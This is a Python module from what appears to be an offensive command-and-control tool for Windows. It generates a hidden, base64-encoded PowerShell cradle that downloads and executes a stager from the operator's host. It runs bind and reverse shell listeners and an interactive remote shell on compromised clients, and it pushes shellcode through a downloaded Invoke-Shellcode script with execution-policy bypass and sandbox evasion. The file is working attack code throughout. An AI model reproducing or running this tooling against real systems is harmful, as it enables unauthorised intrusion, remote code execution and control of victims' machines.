from __future__ import unicode_literals
from main import *
from menu import *
from prompt_toolkit.contrib.completers import WordCompleter

history = prompt_toolkit.history.InMemoryHistory()

serverlist = []

def killAllClients():
    numberofclientskilled = 0
    from menu import clientMenuOptions
    if len(clientMenuOptions) > 2:
        suretoquit = raw_input('You have clients connected. Are you sure you want to exit? [y]/n: ')
        if suretoquit.lower() == 'y' or suretoquit.lower() == '':
            for server in serverlist:
                for clientnumber in server.handlers.keys():
                    numberofclientskilled += 1
                    server.handlers[clientnumber].handle_close()
            return True
        else:
            return False
    else:
        return True

def printListener(printit=True, returnit=False):
    from listener import Server
    from menu import returnIP
    powershellFileName = 'p.ps1'

    while True:
        bindOrReverse = prompt_toolkit.prompt('[?] (b)ind/(r)everse: ', patch_stdout=True, completer=WordCompleter(['b', 'r'])).lower()
        if bindOrReverse == 'b' or bindOrReverse == 'r':
            break
    if bindOrReverse == 'r':
        powershellContent = open('lib/powershell/stager.ps1', 'r').read()
        windows_powershell_stager = powershellContent % ('False', returnIP(), '5555')
    if bindOrReverse == 'b':
        powershellContent = open('lib/powershell/stager.ps1', 'r').read()
        windows_powershell_stager = powershellContent % ('True', '', '5556')

    with open((payloaddir()+ '/' + powershellFileName), 'w') as powershellStagerFile:
        powershellStagerFile.write(windows_powershell_stager)
        powershellStagerFile.close()

    randoStagerDLPort = FUNCTIONS().randomUnusedPort()

    FUNCTIONS().DoServe(returnIP(), powershellFileName, payloaddir(), port=randoStagerDLPort, printIt = False)
    stagerexec = 'powershell -w hidden -noni -enc ' + ("IEX (New-Object Net.Webclient).DownloadString('http://" + returnIP() + ":" + str(randoStagerDLPort) + "/" + powershellFileName + "')").encode('utf_16_le').encode('base64').replace('\n','')

    if printit:
        print t.bold_green + '[!] Run this on target machine...' + t.normal + '\n\n' + stagerexec + '\n'

    if bindOrReverse == 'b':
        if not '5556' in str(serverlist):
            ipADDR = raw_input('[?] IP Address of target (after executing stager): ')
            connectserver = Server(ipADDR, 5556, bindsocket=False)
            serverlist.append(connectserver)

    if bindOrReverse == 'r':
        if not '5555' in str(serverlist):
            listenerserver = Server('0.0.0.0', 5555, bindsocket=True)
            serverlist.append(listenerserver)
    if returnit:
        return stagerexec
    else:
        return "pass"


def interactShell(clientnumber):
    clientnumber = int(clientnumber)
    from menu import clientMenuOptions
    for server in serverlist:
        if clientnumber in server.handlers.keys():
            print "Commands\n" + "-"*50 + "\nback - Background Shell\nexit - Close Connection\n" + "-"*50
            while True:
                try:
                    if server.handlers[clientnumber].in_buffer:
                        print server.handlers[clientnumber].in_buffer.pop()
                    command = prompt_toolkit.prompt("PS >", completer=WordCompleter(['back', 'exit']), style=prompt_toolkit.styles.style_from_dict({prompt_toolkit.token.Token: '#FFCC66'}), history=history)
                    if command.lower() == "back":
                        break
                    if command.lower() == "exit":
                        server.handlers[clientnumber].handle_close()
                        del clientMenuOptions[str(clientnumber)]
                        time.sleep(2)
                        break
                    if command == "":
                        server.handlers[clientnumber].out_buffer.append('{"type":"", "data":"", "sendoutput":""}')
                    else:
                        json = '{"type":"exec", "data":"%s", "sendoutput":"true"}'% ((base64.b64encode(command.encode('utf_16_le'))))
                        server.handlers[clientnumber].out_buffer.append(json)
                        while not server.handlers[clientnumber].in_buffer:
                            time.sleep(0.01)
                        print server.handlers[clientnumber].in_buffer.pop()
                except KeyboardInterrupt:
                    break

    return "clear"

def returnServerList():
    return serverlist

def checkPayloadLength(payload):
    maxlen = 10000
    splitPayload = []
    payloadLen = len(payload)

    if payloadLen > maxlen:
        current_length = 0
        numberOfPackets = int(payloadLen / maxlen)
        if payloadLen % maxlen != 0:
            numberOfPackets += 1

        while current_length < payloadLen:
            cutlength = maxlen
            if payloadLen < current_length + maxlen:
                cutlength = payloadLen - current_length

            tmp_str = payload[current_length:current_length + cutlength]
            current_length += maxlen
            splitPayload.append(tmp_str)
    else:
        splitPayload = None

    return splitPayload


def checkUpload():
    from menu import clientMenuOptions
    use_client_upload = prompt_toolkit.prompt('\n[?] Upload Using Client Connection? [y]/n: ', patch_stdout=True, completer=WordCompleter(['y', 'n']))
    print
    if use_client_upload.lower() == 'y' or use_client_upload == '':
        clientList = []
        for i in clientMenuOptions.keys():
            if i == 'back' or i == 'r':
                pass
            else:
                clientList.append(i)
                print t.bold_yellow + i + t.normal + ': ' + t.bold_green + clientMenuOptions[i]['payload']  + t.bold_yellow + ' | ' + t.bold_green + clientMenuOptions[i]['availablemodules'].keys()[0] + t.bold_yellow + ' | ' + t.bold_green + clientMenuOptions[i]['availablemodules'].keys()[1] + t.normal
        print
        while True:
            clientchoice = prompt_toolkit.prompt('Client > ', patch_stdout=True, style=prompt_toolkit.styles.style_from_dict({prompt_toolkit.token.Token: '#FFCC66'}), completer=WordCompleter(clientList))
            try:
                return int(clientMenuOptions[clientchoice]['params'])
            except:
                continue
    return False

def clientUpload(powershellExec, isExe, json):
    from menu import returnIP
    from encrypt import getSandboxScripts
    clientnumber = checkUpload()
    if clientnumber:
        if isExe:
            newpayloadlayout = FUNCTIONS().powershellShellcodeLayout(powershellExec)
            moduleport = FUNCTIONS().randomUnusedPort()
            FUNCTIONS().DoServe(returnIP(), "", "./externalmodules", port = moduleport, printIt = False)
            encPowershell = getSandboxScripts('powershell')
            encPowershell += "IEX(New-Object Net.WebClient).DownloadString('http://%s:%s/Invoke-Shellcode.ps1');Start-Sleep 30;Invoke-Code -Force -Shellcode @(%s)"%(returnIP(), moduleport, newpayloadlayout.rstrip(','))
            encPowershell = base64.b64encode(encPowershell.encode('UTF-16LE'))
            fullExec = "$Arch = (Get-Process -Id $PID).StartInfo.EnvironmentVariables['PROCESSOR_ARCHITECTURE'];if($Arch -eq 'x86'){powershell -exec bypass -enc \"%s\"}elseif($Arch -eq 'amd64'){$powershell86 = $env:windir + '\SysWOW64\WindowsPowerShell\\v1.0\powershell.exe';& $powershell86 -exec bypass -enc \"%s\"}"%(encPowershell,encPowershell)
            b64Exec = base64.b64encode(fullExec.encode('UTF-16LE'))
            lenb64 = len(b64Exec)
        else:
            b64Exec = base64.b64encode(powershellExec.encode('UTF-16LE'))
            lenb64 = len(b64Exec)


        splitPayoad = checkPayloadLength(b64Exec)

        if splitPayoad:
            for p in splitPayoad:
                for server in serverlist:
                    if clientnumber in server.handlers.keys():
                        server.handlers[clientnumber].out_buffer.append(json % (p))
                        time.sleep(0.5)
            time.sleep(0.5)
            for server in serverlist:
                if clientnumber in server.handlers.keys():
                    server.handlers[clientnumber].out_buffer.append('{"type":"", "data":"", "sendoutput":"false", "multiple":"exec"}')
        else:
            for server in serverlist:
                if clientnumber in server.handlers.keys():
                    server.handlers[clientnumber].out_buffer.append(json % (b64Exec))

        return clientnumber

    else:
        return False
